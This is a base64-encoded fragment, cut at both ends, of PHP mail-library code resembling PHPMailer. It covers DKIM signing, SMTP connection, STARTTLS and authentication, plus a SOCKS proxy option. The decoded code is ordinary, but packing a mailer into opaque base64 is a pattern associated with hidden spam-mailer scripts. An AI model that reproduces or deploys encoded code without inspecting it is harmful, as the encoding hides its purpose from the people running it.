kgew0KICAgICAgICAgICAgaWYgKG9wZW5zc2xfc2lnbigkc2lnbkhlYWRlciwgJHNpZ25hdHVyZSwgJHByaXZLZXksICdzaGEyNTZXaXRoUlNBRW5jcnlwdGlvbicpKSB7DQogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOw0KICAgICAgICAgICAgICAgIHJldHVybiBiYXNlNjRfZW5jb2RlKCRzaWduYXR1cmUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHBpbmZvID0gb3BlbnNzbF9wa2V5X2dldF9kZXRhaWxzKCRwcml2S2V5KTsNCiAgICAgICAgICAgICRoYXNoICA9IGhhc2goJ3NoYTI1NicsICRzaWduSGVhZGVyKTsNCiAgICAgICAgICAgICR0ICAgICA9ICczMDMxMzAwZDA2MDk2MDg2NDgwMTY1MDMwNDAyMDEwNTAwMDQyMCcgLiAkaGFzaDsNCiAgICAgICAgICAgICRwc2xlbiA9ICRwaW5mb1snYml0cyddIC8gOCAtIChzdHJsZW4oJHQpIC8gMiArIDMpOw0KICAgICAgICAgICAgJGViICAgID0gcGFjaygnSConLCAnMDAwMScgLiBzdHJfcmVwZWF0KCdGRicsICRwc2xlbikgLiAnMDAnIC4gJHQpOw0KICAgICAgICAgICAgaWYgKG9wZW5zc2xfcHJpdmF0ZV9lbmNyeXB0KCRlYiwgJHNpZ25hdHVyZSwgJHByaXZLZXksIE9QRU5TU0xfTk9fUEFERElORykpIHsNCiAgICAgICAgICAgICAgICBvcGVuc3NsX3BrZXlfZnJlZSgkcHJpdktleSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIGJhc2U2NF9lbmNvZGUoJHNpZ25hdHVyZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOw0KICAgICAgICByZXR1cm4gJyc7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0hlYWRlckMoJHNpZ25IZWFkZXIpIHsNCiAgICAgICAgJHNpZ25IZWFkZXIgPSBwcmVnX3JlcGxhY2UoJy9cclxuXHMrLycsICcgJywgJHNpZ25IZWFkZXIpOw0KICAgICAgICAkbGluZXMgICAgICA9IGV4cGxvZGUoIlxyXG4iLCAkc2lnbkhlYWRlcik7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAka2V5ID0+ICRsaW5lKSB7DQogICAgICAgICAgICBsaXN0KCRoZWFkaW5nLCAkdmFsdWUpID0gZXhwbG9kZSgnOicsICRsaW5lLCAyKTsNCiAgICAgICAgICAgICRoZWFkaW5nICAgICA9IHN0cnRvbG93ZXIoJGhlYWRpbmcpOw0KICAgICAgICAgICAgJHZhbHVlICAgICAgID0gcHJlZ19yZXBsYWNlKCcvXHN7Mix9LycsICcgJywgJHZhbHVlKTsNCiAgICAgICAgICAgICRsaW5lc1ska2V5XSA9ICRoZWFkaW5nIC4gJzonIC4gdHJpbSgkdmFsdWUpOw0KICAgICAgICB9DQogICAgICAgICRzaWduSGVhZGVyID0gaW1wbG9kZSgiXHJcbiIsICRsaW5lcyk7DQogICAgICAgIHJldHVybiAkc2lnbkhlYWRlcjsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fQm9keUMoJGJvZHkpIHsNCiAgICAgICAgaWYgKCRib2R5ID09ICcnKSB7DQogICAgICAgICAgICByZXR1cm4gIlxyXG4iOw0KICAgICAgICB9DQogICAgICAgICRib2R5ID0gc3RyX3JlcGxhY2UoIlxyXG4iLCAiXG4iLCAkYm9keSk7DQogICAgICAgICRib2R5ID0gc3RyX3JlcGxhY2UoIlxuIiwgIlxyXG4iLCAkYm9keSk7DQogICAgICAgIHdoaWxlIChzdWJzdHIoJGJvZHksIHN0cmxlbigkYm9keSkgLSA0LCA0KSA9PSAiXHJcblxyXG4iKSB7DQogICAgICAgICAgICAkYm9keSA9IHN1YnN0cigkYm9keSwgMCwgc3RybGVuKCRib2R5KSAtIDIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkYm9keTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fQWRkKCRoZWFkZXJzX2xpbmUsICRzdWJqZWN0LCAkYm9keSkgew0KICAgICAgICAkREtJTXNpZ25hdHVyZVR5cGUgICAgPSAncnNhLXNoYTI1Nic7DQogICAgICAgICRES0lNY2Fub25pY2FsaXphdGlvbiA9ICdyZWxheGVkL3NpbXBsZSc7DQogICAgICAgICRES0lNcXVlcnkgICAgICAgICAgICA9ICdkbnMvdHh0JzsNCiAgICAgICAgJERLSU10aW1lICAgICAgICAgICAgID0gdGltZSgpOw0KICAgICAgICAkc3ViamVjdF9oZWFkZXIgICAgICAgPSAiU3ViamVjdDogJHN1YmplY3QiOw0KICAgICAgICAkaGVhZGVycyAgICAgICAgICAgICAgPSBleHBsb2RlKCR0aGlzLT5MRSwgJGhlYWRlcnNfbGluZSk7DQogICAgICAgICRmcm9tX2hlYWRlciAgICAgICAgICA9ICcnOw0KICAgICAgICAkdG9faGVhZGVyICAgICAgICAgICAgPSAnJzsNCiAgICAgICAgJGRhdGVfaGVhZGVyICAgICAgICAgID0gJyc7DQogICAgICAgICRjdXJyZW50ICAgICAgICAgICAgICA9ICcnOw0KICAgICAgICBmb3JlYWNoICgkaGVhZGVycyBhcyAkaGVhZGVyKSB7DQogICAgICAgICAgICBpZiAoc3RycG9zKCRoZWFkZXIsICdGcm9tOicpID09PSAwKSB7DQogICAgICAgICAgICAgICAgJGZyb21faGVhZGVyID0gJGhlYWRlcjsNCiAgICAgICAgICAgICAgICAkY3VycmVudCAgICAgPSAnZnJvbV9oZWFkZXInOw0KICAgICAgICAgICAgfSBlbHNlaWYgKHN0cnBvcygkaGVhZGVyLCAnVG86JykgPT09IDApIHsNCiAgICAgICAgICAgICAgICAkdG9faGVhZGVyID0gJGhlYWRlcjsNCiAgICAgICAgICAgICAgICAkY3VycmVudCAgID0gJ3RvX2hlYWRlcic7DQogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdEYXRlOicpID09PSAwKSB7DQogICAgICAgICAgICAgICAgJGRhdGVfaGVhZGVyID0gJGhlYWRlcjsNCiAgICAgICAgICAgICAgICAkY3VycmVudCAgICAgPSAnZGF0ZV9oZWFkZXInOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCQkY3VycmVudCkgJiYgc3RycG9zKCRoZWFkZXIsICcgPT8nKSA9PT0gMCkgew0KICAgICAgICAgICAgICAgICAgICAkJGN1cnJlbnQgLj0gJGhlYWRlcjsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkY3VycmVudCA9ICcnOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkZnJvbSAgICA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRmcm9tX2hlYWRlcikpOw0KICAgICAgICAkdG8gICAgICA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCR0b19oZWFkZXIpKTsNCiAgICAgICAgJGRhdGUgICAgPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkZGF0ZV9oZWFkZXIpKTsNCiAgICAgICAgJHN1YmplY3QgPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkc3ViamVjdF9oZWFkZXIpKTsNCiAgICAgICAgJGJvZHkgICAgPSAkdGhpcy0+REtJTV9Cb2R5QygkYm9keSk7DQogICAgICAgICRES0lNbGVuID0gc3RybGVuKCRib2R5KTsNCiAgICAgICAgJERLSU1iNjQgPSBiYXNlNjRfZW5jb2RlKHBhY2soJ0gqJywgaGFzaCgnc2hhMjU2JywgJGJvZHkpKSk7DQogICAgICAgIGlmICgnJyA9PSAkdGhpcy0+REtJTV9pZGVudGl0eSkgew0KICAgICAgICAgICAgJGlkZW50ID0gJyc7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkaWRlbnQgPSAnIGk9JyAuICR0aGlzLT5ES0lNX2lkZW50aXR5IC4gJzsnOw0KICAgICAgICB9DQogICAgICAgICRka2ltaGRycyA9ICdES0lNLVNpZ25hdHVyZTogdj0xOyBhPScgLiAkREtJTXNpZ25hdHVyZVR5cGUgLiAnOyBxPScgLiAkREtJTXF1ZXJ5IC4gJzsgbD0nIC4gJERLSU1sZW4gLiAnOyBzPScgLiAkdGhpcy0+REtJTV9zZWxlY3RvciAuICI7XHJcbiIgLiAiXHR0PSIgLiAkREtJTXRpbWUgLiAnOyBjPScgLiAkREtJTWNhbm9uaWNhbGl6YXRpb24gLiAiO1xyXG4iIC4gIlx0aD1Gcm9tOlRvOkRhdGU6U3ViamVjdDtcclxuIiAuICJcdGQ9IiAuICR0aGlzLT5ES0lNX2RvbWFpbiAuICc7JyAuICRpZGVudCAuICJcclxuIiAuICJcdHo9JGZyb21cclxuIiAuICJcdHwkdG9cclxuIiAuICJcdHwkZGF0ZVxyXG4iIC4gIlx0fCRzdWJqZWN0O1xyXG4iIC4gIlx0Ymg9IiAuICRES0lNYjY0IC4gIjtcclxuIiAuICJcdGI9IjsNCiAgICAgICAgJHRvU2lnbiAgID0gJHRoaXMtPkRLSU1fSGVhZGVyQygkZnJvbV9oZWFkZXIgLiAiXHJcbiIgLiAkdG9faGVhZGVyIC4gIlxyXG4iIC4gJGRhdGVfaGVhZGVyIC4gIlxyXG4iIC4gJHN1YmplY3RfaGVhZGVyIC4gIlxyXG4iIC4gJGRraW1oZHJzKTsNCiAgICAgICAgJHNpZ25lZCAgID0gJHRoaXMtPkRLSU1fU2lnbigkdG9TaWduKTsNCiAgICAgICAgcmV0dXJuICRka2ltaGRycyAuICRzaWduZWQgLiAiXHJcbiI7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gaGFzTGluZUxvbmdlclRoYW5NYXgoJHN0cikgew0KICAgICAgICByZXR1cm4gKGJvb2xlYW4pIHByZWdfbWF0Y2goJy9eKC57JyAuIChzZWxmOjpNQVhfTElORV9MRU5HVEggKyAyKSAuICcsfSkvbScsICRzdHIpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VG9BZGRyZXNzZXMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+dG87DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRDY0FkZHJlc3NlcygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5jYzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldEJjY0FkZHJlc3NlcygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5iY2M7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRSZXBseVRvQWRkcmVzc2VzKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPlJlcGx5VG87DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRBbGxSZWNpcGllbnRBZGRyZXNzZXMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+YWxsX3JlY2lwaWVudHM7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBkb0NhbGxiYWNrKCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tKSB7DQogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbikgJiYgaXNfY2FsbGFibGUoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbikpIHsNCiAgICAgICAgICAgICRwYXJhbXMgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAkaXNTZW50LA0KICAgICAgICAgICAgICAgICR0bywNCiAgICAgICAgICAgICAgICAkY2MsDQogICAgICAgICAgICAgICAgJGJjYywNCiAgICAgICAgICAgICAgICAkc3ViamVjdCwNCiAgICAgICAgICAgICAgICAkYm9keSwNCiAgICAgICAgICAgICAgICAkZnJvbQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24sICRwYXJhbXMpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KY2xhc3MgcGhwbWFpbGVyRXhjZXB0aW9uIGV4dGVuZHMgRXhjZXB0aW9uIHsNCiAgICBwdWJsaWMgZnVuY3Rpb24gZXJyb3JNZXNzYWdlKCkgew0KICAgICAgICAkZXJyb3JNc2cgPSAnPHN0cm9uZz4nIC4gJHRoaXMtPmdldE1lc3NhZ2UoKSAuICI8L3N0cm9uZz48YnIgLz5cbiI7DQogICAgICAgIHJldHVybiAkZXJyb3JNc2c7DQogICAgfQ0KfQ0KY2xhc3MgU01UUCB7DQogICAgY29uc3QgQ1JMRiA9ICJcclxuIjsNCiAgICBjb25zdCBERUZBVUxUX1NNVFBfUE9SVCA9IDI1Ow0KICAgIGNvbnN0IE1BWF9MSU5FX0xFTkdUSCA9IDk5ODsNCiAgICBjb25zdCBERUJVR19PRkYgPSAwOw0KICAgIGNvbnN0IERFQlVHX0NMSUVOVCA9IDE7DQogICAgY29uc3QgREVCVUdfU0VSVkVSID0gMjsNCiAgICBjb25zdCBERUJVR19DT05ORUNUSU9OID0gMzsNCiAgICBjb25zdCBERUJVR19MT1dMRVZFTCA9IDQ7DQogICAgcHVibGljICRTTVRQX1BPUlQgPSAyNTsNCiAgICBwdWJsaWMgJENSTEYgPSAiXHJcbiI7DQogICAgcHVibGljICRkb19kZWJ1ZyA9IHNlbGY6OkRFQlVHX09GRjsNCiAgICBwdWJsaWMgJERlYnVnb3V0cHV0ID0gJ2VjaG8nOw0KICAgIHB1YmxpYyAkZG9fdmVycCA9IGZhbHNlOw0KICAgIHB1YmxpYyAkVGltZW91dCA9IDEwOw0KICAgIHB1YmxpYyAkVGltZWxpbWl0ID0gMTA7DQogICAgcHVibGljICRVc2VTb2NrcyA9IGZhbHNlOw0KICAgIHB1YmxpYyAkU29ja3NIb3N0ID0gbnVsbDsNCiAgICBwdWJsaWMgJFNvY2tzUG9ydCA9IDA7DQogICAgcHJvdGVjdGVkICRzbXRwX3RyYW5zYWN0aW9uX2lkX3BhdHRlcm5zID0gYXJyYXkoJ2V4aW0nID0+ICcvWzAtOV17M30gT0sgaWQ9KC4qKS8nLCAnc2VuZG1haWwnID0+ICcvWzAtOV17M30gMi4wLjAgKC4qKSBNZXNzYWdlLycsICdwb3N0Zml4JyA9PiAnL1swLTldezN9IDIuMC4wIE9rOiBxdWV1ZWQgYXMgKC4qKS8nKTsNCiAgICBwcm90ZWN0ZWQgJHNtdHBfY29ubjsNCiAgICBwcm90ZWN0ZWQgJGVycm9yID0gYXJyYXkoJ2Vycm9yJyA9PiAnJywgJ2RldGFpbCcgPT4gJycsICdzbXRwX2NvZGUnID0+ICcnLCAnc210cF9jb2RlX2V4JyA9PiAnJyk7DQogICAgcHJvdGVjdGVkICRoZWxvX3JwbHkgPSBudWxsOw0KICAgIHByb3RlY3RlZCAkc2VydmVyX2NhcHMgPSBudWxsOw0KICAgIHByb3RlY3RlZCAkbGFzdF9yZXBseSA9ICcnOw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlZGVidWcoJHN0ciwgJGxldmVsID0gMCkgew0KICAgICAgICBpZiAoJGxldmVsID4gJHRoaXMtPmRvX2RlYnVnKSB7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFpbl9hcnJheSgkdGhpcy0+RGVidWdvdXRwdXQsIGFycmF5KA0KICAgICAgICAgICAgJ2Vycm9yX2xvZycsDQogICAgICAgICAgICAnaHRtbCcsDQogICAgICAgICAgICAnZWNobycNCiAgICAgICAgKSkgYW5kIGlzX2NhbGxhYmxlKCR0aGlzLT5EZWJ1Z291dHB1dCkpIHsNCiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jKCR0aGlzLT5EZWJ1Z291dHB1dCwgJHN0ciwgJGxldmVsKTsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5EZWJ1Z291dHB1dCkgew0KICAgICAgICAgICAgY2FzZSAnZXJyb3JfbG9nJzoNCiAgICAgICAgICAgICAgICBlcnJvcl9sb2coJHN0cik7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdodG1sJzoNCiAgICAgICAgICAgICAgICBlY2hvIGh0bWxlbnRpdGllcyhwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkc3RyKSwgRU5UX1FVT1RFUywgJ1VURi04JykgLiAiPGJyPlxuIjsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2VjaG8nOg0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAkc3RyID0gcHJlZ19yZXBsYWNlKCcvKFxyXG58XHJ8XG4pL21zJywgIlxuIiwgJHN0cik7DQogICAgICAgICAgICAgICAgZWNobyBnbWRhdGUoJ1ktbS1kIEg6aTpzJykgLiAiXHQiIC4gc3RyX3JlcGxhY2UoIlxuIiwgIlxuICAgICAgICAgICAgICAgICAgIFx0ICAgICAgICAgICAgICAgICAgIiwgdHJpbSgkc3RyKSkgLiAiXG4iOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjb25uZWN0KCRob3N0LCAkcG9ydCA9IG51bGwsICR0aW1lb3V0ID0gMTAsICRvcHRpb25zID0gYXJyYXkoKSkgew0KICAgICAgICBzdGF0aWMgJHN0cmVhbW9rOw0KICAgICAgICBpZiAoaXNfbnVsbCgkc3RyZWFtb2spKSB7DQogICAgICAgICAgICAkc3RyZWFtb2sgPSBmdW5jdGlvbl9leGlzdHMoJ3N0cmVhbV9zb2NrZXRfY2xpZW50Jyk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPnNldEVycm9yKCcnKTsNCiAgICAgICAgaWYgKCR0aGlzLT5jb25uZWN0ZWQoKSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdBbHJlYWR5IGNvbm5lY3RlZCB0byBhIHNlcnZlcicpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmIChlbXB0eSgkcG9ydCkpIHsNCiAgICAgICAgICAgICRwb3J0ID0gc2VsZjo6REVGQVVMVF9TTVRQX1BPUlQ7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5Vc2VTb2Nrcykgew0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiQ29ubmVjdGlvbjogb3BlbmluZyB0byAkaG9zdDokcG9ydCwgc29ja3M9eyR0aGlzLT5Tb2Nrc0hvc3R9OnskdGhpcy0+U29ja3NQb3J0fSwgdGltZW91dD0kdGltZW91dCwgb3B0aW9ucz0iIC4gdmFyX2V4cG9ydCgkb3B0aW9ucywgdHJ1ZSksIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICAgICAgJFNvY2tzU29ja2V0ID0gQGZzb2Nrb3BlbigkdGhpcy0+U29ja3NIb3N0LCAkdGhpcy0+U29ja3NQb3J0LCAkZXJybm8sICRlcnJidWYsICR0aW1lb3V0KTsNCiAgICAgICAgICAgIGlmICghJFNvY2tzU29ja2V0KSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiQ29ubmVjdGlvbiB0byBTT0NLUyBzZXJ2ZXIgY291bGQgbm90IGJlIGVzdGFibGlzaGVkIG9uICIgLiAkdGhpcy0+U29ja3NIb3N0IC4gIjoiIC4gJHRoaXMtPlNvY2tzUG9ydCAuICIgKENvbm5lY3Rpb24gcmVmdXNlZCkiLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmd3JpdGUoJFNvY2tzU29ja2V0LCBwYWNrKCJDMyIsIDB4MDUsIDB4MDEsIDB4MDApKTsNCiAgICAgICAgICAgICRTb2Nrc1N0YXR1cyA9IGZyZWFkKCRTb2Nrc1NvY2tldCwgODE5Mik7DQogICAgICAgICAgICAkcmVzcG9uY2UgICAgPSB1bnBhY2soIkN2ZXJzaW9uL0NtZXRob2QiLCAkU29ja3NTdGF0dXMpOw0KICAgICAgICAgICAgaWYgKCRyZXNwb25jZVsidmVyc2lvbiJdICE9IDB4MDUgYW5kICRyZXNwb25jZVsibWV0aG9kIl0gIT0gMHgwMCkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIlNPQ0tTIFNlcnZlciBkb2VzIG5vdCBzdXBwb3J0IHRoaXMgdmVyc2lvbiBhbmQvb3IgYXV0aGVudGljYXRpb24gbWV0aG9kIG9mIFNPQ0tTLiIsIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChpcDJsb25nKCRob3N0KSA9PSAtMSkgew0KICAgICAgICAgICAgICAgIGZ3cml0ZSgkU29ja3NTb2NrZXQsIHBhY2soIkM1IiwgMHgwNSwgMHgwMSwgMHgwMCwgMHgwMywgc3RybGVuKCRob3N0KSkgLiAkaG9zdCAuIHBhY2soIm4iLCAkcG9ydCkpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBmd3JpdGUoJFNvY2tzU29ja2V0LCBwYWNrKCJDNE5uIiwgMHgwNSwgMHgwMSwgMHgwMCwgMHgwMSwgaXAybG9uZyhnZXRob3N0YnluYW1lKCRob3N0KSksICRwb3J0KSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkU29ja3NTdGF0dXMgPSBmcmVhZCgkU29ja3NTb2NrZXQsIDgxOTIpOw0KICAgICAgICAgICAgJHJlc3BvbmNlICAgID0gdW5wYWNrKCJDdmVyc2lvbi9DcmVzdWx0L0NyZWcvQ3R5cGUvTGlwL1Nwb3J0IiwgJFNvY2tzU3RhdHVzKTsNCiAgICAgICAgICAgIGlmICgkcmVzcG9uY2VbInZlcnNpb24iXSA9PSAweDA1IGFuZCAkcmVzcG9uY2VbInJlc3VsdCJdID09IDB4MDApIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c210cF9jb25uID0gJFNvY2tzU29ja2V0Ow0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJUaGUgU09DS1Mgc2VydmVyIGZhaWxlZCB0byBjb25uZWN0IHRvIHRoZSBzcGVjaWZpY2VkIGhvc3QgYW5kIHBvcnQuICggIiAuICRob3N0IC4gIjoiIC4gJHBvcnQgLiAiICkiLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJDb25uZWN0aW9uOiBvcGVuaW5nIHRvICRob3N0OiRwb3J0LCB0aW1lb3V0PSR0aW1lb3V0LCBvcHRpb25zPSIgLiB2YXJfZXhwb3J0KCRvcHRpb25zLCB0cnVlKSwgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgICAgICAkZXJybm8gID0gMDsNCiAgICAgICAgICAgICRlcnJzdHIgPSAnJzsNCiAgICAgICAgICAgIGlmICgkc3RyZWFtb2spIHsNCiAgICAgICAgICAgICAgICAkc29ja2V0X2NvbnRleHQgID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKCRvcHRpb25zKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c210cF9jb25uID0gQHN0cmVhbV9zb2NrZXRfY2xpZW50KCRob3N0IC4gIjoiIC4gJHBvcnQsICRlcnJubywgJGVycnN0ciwgJHRpbWVvdXQsIFNUUkVBTV9DTElFTlRfQ09OTkVDVCwgJHNvY2tldF9jb250ZXh0KTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiQ29ubmVjdGlvbjogc3RyZWFtX3NvY2tldF9jbGllbnQgbm90IGF2YWlsYWJsZSwgZmFsbGluZyBiYWNrIHRvIGZzb2Nrb3BlbiIsIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04pOw0KICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwX2Nvbm4gPSBmc29ja29wZW4oJGhvc3QsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsICR0aW1lb3V0KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ0ZhaWxlZCB0byBjb25uZWN0IHRvIHNlcnZlcicsICRlcnJubywgJGVycnN0cik7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTTVRQIEVSUk9SOiAnIC4gJHRoaXMtPmVycm9yWydlcnJvciddIC4gIjogJGVycnN0ciAoJGVycm5vKSIsIHNlbGY6OkRFQlVHX0NMSUVOVCk7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmVkZWJ1ZygnQ29ubmVjdGlvbjogb3BlbmVkJywgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7DQogICAgICAgIGlmIChzdWJzdHIoUEhQX09TLCAwLCAzKSAhPSAnV0lOJykgew0KICAgICAgICAgICAgJG1heCA9IGluaV9nZXQoJ21heF9leGVjdXRpb25fdGltZScpOw0KICAgICAgICAgICAgaWYgKCRtYXggIT0gMCAmJiAkdGltZW91dCA+ICRtYXgpIHsNCiAgICAgICAgICAgICAgICBAc2V0X3RpbWVfbGltaXQoJHRpbWVvdXQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgc3RyZWFtX3NldF90aW1lb3V0KCR0aGlzLT5zbXRwX2Nvbm4sICR0aW1lb3V0LCAwKTsNCiAgICAgICAgfQ0KICAgICAgICAkYW5ub3VuY2UgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7DQogICAgICAgICR0aGlzLT5lZGVidWcoJ1NFUlZFUiAtPiBDTElFTlQ6ICcgLiAkYW5ub3VuY2UsIHNlbGY6OkRFQlVHX1NFUlZFUik7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc3RhcnRUTFMoKSB7DQogICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdTVEFSVFRMUycsICdTVEFSVFRMUycsIDIyMCkpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkY3J5cHRvX21ldGhvZCA9IFNUUkVBTV9DUllQVE9fTUVUSE9EX1RMU19DTElFTlQ7DQogICAgICAgIGlmIChkZWZpbmVkKCdTVFJFQU1fQ1JZUFRPX01FVEhPRF9UTFN2MV8yX0NMSUVOVCcpKSB7DQogICAgICAgICAgICAkY3J5cHRvX21ldGhvZCB8PSBTVFJFQU1fQ1JZUFRPX01FVEhPRF9UTFN2MV8yX0NMSUVOVDsNCiAgICAgICAgICAgICRjcnlwdG9fbWV0aG9kIHw9IFNUUkVBTV9DUllQVE9fTUVUSE9EX1RMU3YxXzFfQ0xJRU5UOw0KICAgICAgICB9DQogICAgICAgIGlmICghc3RyZWFtX3NvY2tldF9lbmFibGVfY3J5cHRvKCR0aGlzLT5zbXRwX2Nvbm4sIHRydWUsICRjcnlwdG9fbWV0aG9kKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYXV0aGVudGljYXRlKCR1c2VybmFtZSwgJHBhc3N3b3JkLCAkYXV0aHR5cGUgPSBudWxsLCAkcmVhbG0gPSAnJywgJHdvcmtzdGF0aW9uID0gJycsICRPQXV0aCA9IG51bGwpIHsNCiAgICAgICAgaWYgKCEkdGhpcy0+c2VydmVyX2NhcHMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignQXV0aGVudGljYXRpb24gaXMgbm90IGFsbG93ZWQgYmVmb3JlIEhFTE8vRUhMTycpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKCdFSExPJywgJHRoaXMtPnNlcnZlcl9jYXBzKSkgew0KICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCdBVVRIJywgJHRoaXMtPnNlcnZlcl9jYXBzKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignQXV0aGVudGljYXRpb24gaXMgbm90IGFsbG93ZWQgYXQgdGhpcyBzdGFnZScpOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHNlbGY6OmVkZWJ1ZygnQXV0a